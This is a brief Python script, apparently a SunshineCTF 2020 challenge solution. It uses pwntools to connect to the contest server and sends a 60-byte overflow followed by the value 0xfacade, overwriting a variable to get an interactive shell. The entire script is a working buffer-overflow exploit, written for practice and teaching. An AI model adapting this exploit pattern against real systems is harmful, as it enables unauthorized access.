from pwn import remote, p64

# p = process('./chall_00')
p = remote('chal.2020.sunshinectf.org', 30000)

payload = b'x' * 60
payload += p64(0xfacade)

p.sendline(payload)
p.recvline()
p.interactive()